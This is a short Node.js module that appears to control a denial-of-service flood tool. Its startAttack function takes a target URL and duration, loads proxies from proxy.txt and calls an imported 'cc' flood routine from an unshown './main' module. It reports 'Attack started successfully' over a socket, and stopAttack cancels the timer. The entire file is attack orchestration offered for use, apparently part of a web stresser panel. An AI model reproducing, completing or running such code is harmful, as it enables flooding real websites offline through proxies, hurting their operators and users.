const { cc, post, head, ParseUrl } = require('./main');
const fs = require('fs');
const path = require('path');

let attackInProgress = false;
let attackInterval;

const startAttack = (url, time, socket) => {
  if (attackInProgress) return;
  attackInProgress = true;

  ParseUrl(url);
  const proxies = fs.readFileSync(path.join(__dirname, 'proxy.txt'), 'utf8').split('\n');

  cc({ wait: () => {}, set: () => {} }, 5);

  socket.emit('attackStarted', '🌸 Attack started successfully');

  attackInterval = setTimeout(() => {
    attackInProgress = false;
    socket.emit('attackStopped', 'Attack finished');
  }, time * 1000);
};

const stopAttack = () => {
  if (attackInProgress) {
    clearTimeout(attackInterval);
    attackInProgress = false;
  }
};

module.exports = { startAttack, stopAttack };
